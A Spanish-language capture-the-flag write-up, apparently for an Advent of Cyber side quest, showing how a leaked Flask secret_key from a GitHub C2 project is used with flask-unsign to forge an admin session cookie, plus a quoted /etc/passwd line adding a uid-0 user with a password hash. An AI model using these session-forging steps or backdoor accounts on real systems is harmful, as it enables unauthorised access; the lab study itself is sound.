En el Github del usuario que responde al Alcalde Malware, encontramos un código de una aplicación de C2 en flask:

https://github.com/Bloatware-WarevilleTHM/C2-Server/blame/main/app.py

Además lanzando nmap sobre la máquina del primer challenge, encontramos esa misma aplicación:

![[Pasted image 20241203002627.png]]

Como en github tenemos la secret_key, podemos [generar nuestra propia cookie de admin](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce):

```bash
flask-unsign --sign --cookie "{'logged_in':True,'username':'admin'}" --secret "@09JKD0934jd712?djD"

eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z05A8g.QqBS6TL_dsSEr-iFtZzBIF_c384
```

En mi caso he utilizado la extensión cookie-editor, aunque lo puedes guardar directamente con las herramientas de desarrollador, con eso podremos acceder al dashboard:

![[Writeups/THM/AdventOfCyber/SQ1/dashboard.png]]

y en data tenemos la card:

![[aoc-sidequest-keycard2.png]]

El reto de wireshark en si es muy facil, con poner http y que sea por post se sacn los dos primeros. Luego hay un archivo que contiene una entrada del /etc/passwd:

![[Pasted image 20241203010108.png]]

`user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash`